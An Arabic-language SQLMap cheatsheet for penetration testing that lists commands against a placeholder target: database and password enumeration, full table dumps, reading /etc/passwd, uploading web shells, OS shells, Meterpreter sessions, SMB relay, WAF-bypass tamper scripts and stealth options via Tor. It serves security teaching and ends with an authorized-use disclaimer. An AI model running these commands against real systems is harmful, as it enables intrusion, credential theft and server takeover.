<a id="-sqlmap---complete-cheatsheet"></a>
# 💉 SQLMap — دليل مرجعي شامل

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Automatic SQL Injection Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🔥 أداة متقدمة لأتمتة اختبار حقن SQL</b>
</p>

---

<a id="-table-of-contents"></a>
## 📋 جدول المحتويات

- [مقدمة](#-introduction)
- [التثبيت](#-installation)
- [الصيغة الأساسية](#-basic-syntax)
- [خيارات الهدف](#-target-options)
- [خيارات الطلب](#-request-options)
- [خيارات الاكتشاف](#-detection-options)
- [حصر المعلومات](#-enumeration)
- [استخراج البيانات](#-data-extraction)
- [عمليات الملفات](#-file-operations)
- [الوصول إلى نظام التشغيل](#-os-access)
- [تقنيات التجاوز](#-bypass-techniques)
- [سكربتات تعديل الحمولة (Tamper)](#tamper-scripts-reference)
- [أمثلة عملية](#-real-world-examples)
- [مرجع سريع](#-quick-reference)
- [نصائح وأفضل الممارسات](#-tips--best-practices)
- [المراجع](#-resources)

---

<a id="-introduction"></a>
## 🎯 مقدمة

**SQLMap** أداة مفتوحة المصدر لاختبار الاختراق، تؤتمت اكتشاف ثغرات حقن SQL واستغلالها.

<a id="key-features"></a>
### الميزات الأساسية

| الميزة | الوصف |
|---------|-------------|
| **الاكتشاف الآلي** | اكتشاف ثغرات حقن SQL آلياً |
| **دعم قواعد البيانات** | MySQL وPostgreSQL وMSSQL وOracle وSQLite وغيرها |
| **التحكم الكامل وفق وصف الأصل** | تحديد نوع قاعدة البيانات واستخراج البيانات والوصول إلى نظام التشغيل |
| **تقنيات التجاوز** | محاولة تجاوز جدار حماية تطبيقات الويب WAF ونظام منع التسلل IPS باستخدام سكربتات Tamper |
| **أنواع حقن متعددة** | الحقن المنطقي والقائم على الأخطاء وUNION والاستعلامات المتعددة والتوقيت |

<a id="supported-databases"></a>
### قواعد البيانات المدعومة

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

<a id="sql-injection-types"></a>
### أنواع حقن SQL

| النوع | الرمز | الوصف |
|------|------|-------------|
| حقن أعمى قائم على القيم المنطقية | `B` | استجابات بحسب صحة الشرط أو خطئه |
| حقن قائم على الأخطاء | `E` | أخطاء قاعدة البيانات ضمن الاستجابة |
| حقن قائم على استعلام UNION | `U` | حقن UNION SELECT |
| استعلامات متتابعة متعددة | `S` | عدة استعلامات مفصولة بـ (;) |
| حقن أعمى قائم على التوقيت | `T` | تأخير زمن الاستجابة |
| استعلامات مضمنة | `Q` | استعلامات مضمنة أو متداخلة |

---

<a id="-installation"></a>
## 📥 التثبيت

<a id="kali-linux-pre-installed"></a>
### Kali Linux (مثبت مسبقاً)
```bash
# تحديث SQLMap
sudo apt update && sudo apt install sqlmap
```

<a id="from-github-latest-version"></a>
### من GitHub (أحدث إصدار وفق الأصل)
```bash
# استنساخ المستودع
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# تشغيل SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

<a id="using-pip"></a>
### باستخدام pip
```bash
pip install sqlmap
```

<a id="docker"></a>
### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

<a id="verify-installation"></a>
### التحقق من التثبيت
```bash
sqlmap --version
sqlmap -h          # المساعدة الأساسية
sqlmap -hh         # المساعدة المتقدمة
```

---

<a id="-basic-syntax"></a>
## ⌨️ الصيغة الأساسية

<a id="general-syntax"></a>
### الصيغة العامة
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

<a id="quick-start-examples"></a>
### أمثلة للبداية السريعة
```bash
# فحص أساسي
sqlmap -u "http://target.com/page.php?id=1"

# الفحص مع ملف تعريف ارتباط
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# فحص طلب POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# الفحص من ملف
sqlmap -r request.txt

# وضع تلقائي باستخدام الإجابات الافتراضية
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

<a id="-target-options"></a>
## 🎯 خيارات الهدف

<a id="url-target--u"></a>
### هدف بعنوان URL (-u)
```bash
# عنوان URL أساسي
sqlmap -u "http://target.com/page.php?id=1"

# عدة معاملات
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# تحديد المعامل المطلوب اختباره
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# اختبار جميع المعاملات وفق وصف الأصل
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

<a id="request-file--r"></a>
### ملف طلب HTTP (-r)
```bash
# حفظ الطلب من Burp Suite إلى ملف
# ثم الفحص:
sqlmap -r request.txt

# مثال لملف الطلب:
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

<a id="google-dork--g"></a>
### استعلام بحث متقدم Google Dork (-g)
```bash
# البحث عن نتائج Google واختبارها
sqlmap -g "inurl:page.php?id="

# مع صفحات محددة
sqlmap -g "inurl:product.php?id= site:target.com"
```

<a id="direct-database-connection--d"></a>
### اتصال مباشر بقاعدة البيانات (-d)
```bash
# الاتصال مباشرة بقاعدة البيانات
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

<a id="bulk-targets--m"></a>
### أهداف متعددة من ملف (-m)
```bash
# ملف يتضمن عدة عناوين URL
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

<a id="configuration-file--c"></a>
### ملف الإعدادات (-c)
```bash
# استخدام ملف الإعدادات
sqlmap -c sqlmap.conf
```

---

<a id="-request-options"></a>
## 📡 خيارات الطلب

<a id="http-method--data"></a>
### طريقة طلب HTTP والبيانات
```bash
# بيانات POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# تحديد طريقة الطلب
sqlmap -u "http://target.com/api/user/1" --method=PUT

# بيانات JSON
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

<a id="cookies"></a>
### ملفات تعريف الارتباط (Cookies)
```bash
# ملف تعريف ارتباط واحد
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# عدة ملفات تعريف ارتباط
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# تحميل ملفات تعريف الارتباط من ملف
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# اختبار معامل داخل ملف تعريف الارتباط
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

<a id="headers"></a>
### الترويسات (Headers)
```bash
# ترويسة مخصصة
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# عدة ترويسات
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# ترويسة User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# قيمة User-Agent عشوائية
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# ترويسة Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

<a id="authentication"></a>
### المصادقة
```bash
# مصادقة Basic
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# مصادقة Digest
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# مصادقة NTLM
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

<a id="proxy"></a>
### الوكيل (Proxy)
```bash
# وكيل HTTP
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# وكيل SOCKS
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# التحقق من Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

<a id="-detection-options"></a>
## 🔍 خيارات الاكتشاف

<a id="level--risk"></a>
### مستوى الاختبارات والمخاطر

> **توضيح:** `--level` يوسّع الاختبارات ومواقع الإدخال، و`--risk` يضيف اختبارات أعلى أثراً. وصف المستوى 1 بأنه «آمن» ليس ضماناً؛ توضح [وثائق SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Usage) أن اختبارات OR عند `--risk=3` قد تغيّر سجلات عند حقنها في سياق UPDATE. لا تُرفع القيم تلقائياً لمجرد غياب نتيجة.

```bash
# المستوى (1-5): عدد الاختبارات
sqlmap -u "http://target.com/page.php?id=1" --level=3

# المخاطر (1-3): خطورة الاختبارات
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# موصى به لفحص موسع وفق الأصل
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| المستوى | الاختبارات |
|-------|-------|
| 1 | الافتراضي: اختبارات أساسية |
| 2 | + اختبار ملفات تعريف الارتباط |
| 3 | + اختبار User-Agent وReferer |
| 4 | + حمولات إضافية |
| 5 | + جميع الحمولات وفق وصف الأصل |

| المخاطر | الوصف |
|------|-------------|
| 1 | الافتراضي: اختبارات منخفضة المخاطر وفق الأصل |
| 2 | + اختبارات توقيت ذات استعلامات ثقيلة |
| 3 | + اختبارات قائمة على OR قد تعدّل البيانات! |

<a id="technique-selection"></a>
### اختيار التقنية
```bash
# تقنية محددة
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # تقنية UNION فقط
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # التقنية المنطقية فقط
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # تقنية الأخطاء فقط
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # تقنية التوقيت فقط
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # الاستعلامات المتعددة فقط

# عدة تقنيات
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# جميع التقنيات، الافتراضي
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

<a id="time-delays"></a>
### التأخيرات الزمنية
```bash
# مدة تأخير الحقن القائم على التوقيت، الافتراضي: 5
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# التأخير بين الطلبات
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

<a id="threads"></a>
### خيوط التنفيذ المتزامنة (Threads)
```bash
# الاتصالات المتزامنة، الافتراضي: 1
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

<a id="-enumeration"></a>
## 📊 حصر المعلومات

<a id="database-enumeration"></a>
### حصر قواعد البيانات
```bash
# عرض قاعدة البيانات الحالية
sqlmap -u "http://target.com/page.php?id=1" --current-db

# عرض المستخدم الحالي
sqlmap -u "http://target.com/page.php?id=1" --current-user

# التحقق من كون المستخدم مسؤول قاعدة البيانات DBA
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# عرض جميع قواعد البيانات
sqlmap -u "http://target.com/page.php?id=1" --dbs

# عرض جميع المستخدمين
sqlmap -u "http://target.com/page.php?id=1" --users

# عرض كلمات مرور المستخدمين وفق وصف الأصل
sqlmap -u "http://target.com/page.php?id=1" --passwords

# عرض الصلاحيات
sqlmap -u "http://target.com/page.php?id=1" --privileges

# عرض الأدوار
sqlmap -u "http://target.com/page.php?id=1" --roles
```

<a id="table-enumeration"></a>
### حصر الجداول
```bash
# عرض جداول قاعدة البيانات
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# عرض جميع الجداول
sqlmap -u "http://target.com/page.php?id=1" --tables

# عدّ سجلات الجداول
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

<a id="column-enumeration"></a>
### حصر الأعمدة
```bash
# عرض أعمدة الجدول
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# البحث عن أسماء الأعمدة
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

<a id="schema-dump"></a>
### استخراج بنية قاعدة البيانات (Schema)
```bash
# استخراج بنية قاعدة البيانات
sqlmap -u "http://target.com/page.php?id=1" --schema

# استبعاد قواعد بيانات النظام
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

<a id="-data-extraction"></a>
## 📤 استخراج البيانات

<a id="dump-data"></a>
### تفريغ البيانات
```bash
# تفريغ جدول محدد
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# تفريغ أعمدة محددة
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# تفريغ جميع جداول قاعدة البيانات
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# تفريغ جميع البيانات
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# استبعاد قواعد بيانات النظام
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

<a id="limit-results"></a>
### تقييد النتائج
```bash
# أول 10 صفوف
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# الصفوف 5-15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# شرط WHERE
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

<a id="custom-sql-queries"></a>
### استعلامات SQL مخصصة
```bash
# تنفيذ استعلام SQL
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# صدفة SQL تفاعلية
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

<a id="output-formats"></a>
### صيغ المخرجات

> **تصحيح:** `--output-dir` يحدد مجلد المخرجات ولا يختار HTML. تحدد [الوثائق الرسمية](https://github.com/sqlmapproject/sqlmap/wiki/Usage) الصيغة بواسطة `--dump-format`؛ أما `--csv-del` فيحدد فاصل CSV. بقي مثال الأصل وتعليقه كما هما.

```bash
# الحفظ بصيغة CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# الحفظ بصيغة HTML وفق تعليق الأصل
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

<a id="-file-operations"></a>
## 📁 عمليات الملفات

<a id="read-files"></a>
### قراءة الملفات
```bash
# قراءة ملف من الخادم
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# قراءة ملفات Windows
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# قراءة إعدادات الويب
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

<a id="write-files"></a>
### كتابة الملفات
```bash
# كتابة ملف على الخادم
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# رفع صدفة ويب (Web Shell)
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

<a id="-os-access"></a>
## 💻 الوصول إلى نظام التشغيل

> **ملاحظة المتطلبات:** دعم قراءة الملفات وكتابتها والوصول إلى النظام يتوقف على محرك قاعدة البيانات والصلاحيات وتقنية الحقن. الأمثلة لا تضمن توافر هذه القدرات لكل ثغرة. [الدليل الرسمي](https://github.com/sqlmapproject/sqlmap/wiki/Usage).


<a id="command-execution"></a>
### تنفيذ الأوامر
```bash
# تنفيذ أمر نظام التشغيل
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# صدفة أوامر تفاعلية
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# استخدام PowerShell على Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

<a id="meterpreter-session"></a>
### جلسة Meterpreter
```bash
# الحصول على جلسة Meterpreter
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# مع خيارات محددة
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

<a id="smb-relay"></a>
### ترحيل مصادقة SMB (SMB Relay)
```bash
# هجوم ترحيل SMB
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

<a id="registry-access-windows"></a>
### الوصول إلى سجل Windows

> **تصحيح كتابي:** يستخدم مثال القراءة `-reg-key` بشرطة واحدة؛ الصيغة الموثقة هي `--reg-key` بشرطتين. حُفظ المثال الحرفي، ومرجع المقارنة هو [دليل الاستخدام الرسمي](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

```bash
# قراءة السجل
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# إضافة مفتاح إلى السجل
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# حذف مفتاح من السجل
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

<a id="-bypass-techniques"></a>
## 🛡️ تقنيات التجاوز

<a id="wafips-bypass"></a>
### تجاوز WAF/IPS

> **ملاحظة إصدار:** يسجل [المصدر الرسمي](https://github.com/sqlmapproject/sqlmap/blob/master/lib/core/dicts.py) الخيار `--identify-waf` ضمن الخيارات القديمة لأن وظيفته تُجرى تلقائياً. احتُفظ به لأمانة النقل. نجاح سكربت Tamper يعتمد على التطبيق وقاعدة البيانات والمرشح؛ لا يثبت تجاوز WAF بمجرد إضافته.

```bash
# تحديد WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# تجاوز اكتشاف WAF
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# تغيير حالة الأحرف عشوائياً
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# عدة سكربتات Tamper
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

<a id="common-tamper-scripts"></a>
### سكربتات Tamper شائعة
```bash
# ترميز URL
--tamper=charencode

# ترميز URL مزدوج
--tamper=chardoubleencode

# ترميز Unicode
--tamper=charunicodeencode

# استبدال المسافات بتعليقات
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# تغيير حالة الأحرف
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# استبدال الكلمات المفتاحية
--tamper=between
--tamper=equaltolike
```

<a id="tamper-scripts-reference"></a>
### مرجع سكربتات Tamper

| السكربت | الوصف |
|--------|-------------|
| `apostrophemask` | استبدال علامة الاقتباس المفردة بتمثيل UTF-8 وفق الوصف المختصر للأصل |
| `apostrophenullencode` | استبدال الاقتباس المفرد بتمثيل Unicode مزدوج وفق الأصل |
| `base64encode` | ترميز الحمولة بصيغة Base64 |
| `between` | استبدال `>` بـ `NOT BETWEEN 0 AND #` |
| `charencode` | ترميز الأحرف بصيغة URL |
| `charunicodeencode` | ترميز Unicode-URL |
| `concat2concatws` | استبدال `CONCAT` بـ `CONCAT_WS` |
| `equaltolike` | استبدال `=` بـ `LIKE` |
| `greatest` | استبدال `>` بـ `GREATEST` |
| `halfversionedmorekeywords` | إضافة تعليق MySQL مرتبط بالإصدار |
| `ifnull2ifisnull` | استبدال `IFNULL` بـ `IF(ISNULL())` |
| `lowercase` | تحويل الكلمات المفتاحية إلى أحرف صغيرة |
| `modsecurityversioned` | محاولة تجاوز ModSecurity بتعليق مرتبط بالإصدار |
| `modsecurityzeroversioned` | محاولة تجاوز ModSecurity بتعليق ذي إصدار صفري |
| `percentage` | إضافة علامة النسبة المئوية قبل الأحرف |
| `randomcase` | تغيير حالة أحرف الكلمات المفتاحية عشوائياً |
| `randomcomments` | إضافة تعليقات عشوائية إلى كلمات SQL المفتاحية |
| `securesphere` | إلحاق سلسلة خاصة لمحاولة تجاوز SecureSphere |
| `space2comment` | استبدال المسافة بـ `/**/` |
| `space2dash` | استبدال المسافة بتعليق يبدأ بـ `--` |
| `space2hash` | استبدال المسافة بتعليق يبدأ بـ `#` |
| `space2morehash` | استبدال المسافة بـ `#` وسطر جديد |
| `space2mssqlblank` | استبدال المسافة بأحرف فراغ خاصة بـ MSSQL |
| `space2mssqlhash` | استبدال المسافة بـ `#` وسطر جديد في MSSQL |
| `space2plus` | استبدال المسافة بـ `+` |
| `space2randomblank` | استبدال المسافة بحرف فراغ عشوائي |
| `symboliclogical` | استبدال `AND`/`OR` بـ `&&`/`\|\|` |
| `unionalltounion` | استبدال `UNION ALL` بـ `UNION` |
| `unmagicquotes` | استبدال الاقتباس بتمثيل متعدد البايتات `%bf%27` |
| `uppercase` | تحويل الكلمات المفتاحية إلى أحرف كبيرة |
| `versionedkeywords` | إحاطة الكلمات المفتاحية بتعليق مرتبط بالإصدار |
| `versionedmorekeywords` | إحاطة كلمات مفتاحية إضافية بتعليق مرتبط بالإصدار |
| `xforwardedfor` | إضافة ترويسة `X-Forwarded-For` مزيفة |

---

<a id="-real-world-examples"></a>
## 🎬 أمثلة عملية

<a id="example-1-basic-scan"></a>
### المثال 1: فحص أساسي
```bash
# الفحص بالوضع التلقائي
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

<a id="example-2-full-database-dump"></a>
### المثال 2: تفريغ قاعدة البيانات كاملة
```bash
# الحصر والتفريغ
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# بعد العثور على قاعدة البيانات
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# تفريغ جدول users
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

<a id="example-3-post-request-with-cookie"></a>
### المثال 3: طلب POST مع ملف تعريف ارتباط
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

<a id="example-4-through-burp-proxy"></a>
### المثال 4: عبر وكيل Burp
```bash
# حفظ الطلب من Burp في ملف، ثم:
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

<a id="example-5-waf-bypass"></a>
### المثال 5: تجاوز WAF
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

<a id="example-6-get-os-shell"></a>
### المثال 6: الحصول على صدفة أوامر النظام
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

<a id="example-7-read-sensitive-files"></a>
### المثال 7: قراءة ملفات حساسة
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="essential-commands"></a>
### الأوامر الضرورية

| الأمر | الوصف |
|---------|-------------|
| `-u URL` | عنوان URL الهدف مع معامل |
| `-r FILE` | تحميل الطلب من ملف |
| `--data=DATA` | بيانات POST |
| `--cookie=COOKIE` | ملف تعريف ارتباط HTTP |
| `--dbs` | عرض قواعد البيانات |
| `--tables` | عرض الجداول |
| `--columns` | عرض الأعمدة |
| `--dump` | تفريغ البيانات |
| `-D DB` | تحديد قاعدة البيانات |
| `-T TABLE` | تحديد الجدول |
| `-C COLS` | تحديد الأعمدة |
| `--batch` | وضع غير تفاعلي |

<a id="detection-options"></a>
### خيارات الاكتشاف

| الخيار | الوصف |
|--------|-------------|
| `--level=LEVEL` | مستوى الاختبارات (1-5) |
| `--risk=RISK` | مستوى المخاطر (1-3) |
| `-p PARAM` | المعامل المطلوب اختباره |
| `--technique=TECH` | تقنية الحقن |
| `--threads=N` | خيوط تنفيذ متزامنة |

<a id="output-options"></a>
### خيارات المخرجات

| الخيار | الوصف |
|--------|-------------|
| `-v LEVEL` | تفصيل المخرجات (0-6) |
| `--batch` | عدم طلب إدخال من المستخدم |
| `--flush-session` | مسح ذاكرة الجلسة المؤقتة |
| `--output-dir=DIR` | مجلد مخصص للمخرجات |

---

<a id="-tips--best-practices"></a>
## 💡 نصائح وأفضل الممارسات

<a id="performance-tips"></a>
### نصائح الأداء

1. **ابدأ ببساطة**
   ```bash
   # البدء بمستوى منخفض
   sqlmap -u "URL" --level=1 --batch
   # الزيادة عند الحاجة
   ```

2. **استخدام --batch للأتمتة**

> **توضيح:** `--batch` يعتمد الإجابات الافتراضية عند طلب الإدخال؛ لا يعني إجراء كل العمليات أو ضمان نجاحها. [توثيق SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **توفير الوقت باختبارات محددة**
   ```bash
   # اختبار تقنية UNION فقط
   sqlmap -u "URL" --technique=U
   ```

<a id="stealth-tips"></a>
### نصائح تقليل الظهور

1. **قيمة User-Agent عشوائية**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **إضافة تأخير**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **استخدام Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

<a id="troubleshooting"></a>
### استكشاف المشكلات وحلها

| المشكلة | الحل |
|-------|----------|
| عدم العثور على حقن | زيادة `--level` و`--risk` وفق اقتراح الأصل |
| حجب بواسطة WAF | استخدام سكربتات `--tamper` |
| بطء الفحص | تقليل `--level` واستخدام `--technique` محددة |
| مشكلات الاتصال | فحص `--timeout` و`--retries` |

---

<a id="-legal-disclaimer"></a>
## ⚠️ تنبيه قانوني

> **تحذير:** SQLMap أداة قوية ينبغي استخدامها فقط في **الاختبار المصرح به**.
> 
> - ✅ اختبر الأنظمة التي تملكها
> - ✅ اختبر بإذن كتابي صريح
> - ✅ استخدمها في مهام اختبار اختراق قانونية
> - ❌ لا تستخدمها على أنظمة دون تفويض
> - ❌ لا تستخدمها لأغراض ضارة
> 
> **الوصول غير المصرح به إلى أنظمة الحاسوب مخالف للقانون ويعرّض للمساءلة.**

---

<a id="-resources"></a>
## 📚 المراجع

<a id="official-resources"></a>
### المراجع الرسمية
- [الموقع الرسمي لـ SQLMap](https://sqlmap.org/)
- [مستودع SQLMap على GitHub](https://github.com/sqlmapproject/sqlmap)
- [ويكي SQLMap](https://github.com/sqlmapproject/sqlmap/wiki)

<a id="learning-resources"></a>
### مراجع التعلم
- [حقن SQL في OWASP](https://owasp.org/www-community/attacks/SQL_Injection)
- [حقن SQL في PortSwigger](https://portswigger.net/web-security/sql-injection)

<a id="related-cheatsheets"></a>
### أدلة مرجعية ذات صلة
- [Metasploit Framework](../../Metasploit/translations/README.ar.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.ar.md)

---

<p align="center">
  <b>💉 أتقن اختبار حقن SQL!</b><br>
  <i>مع القوة الكبيرة تأتي مسؤولية كبيرة</i>
</p>
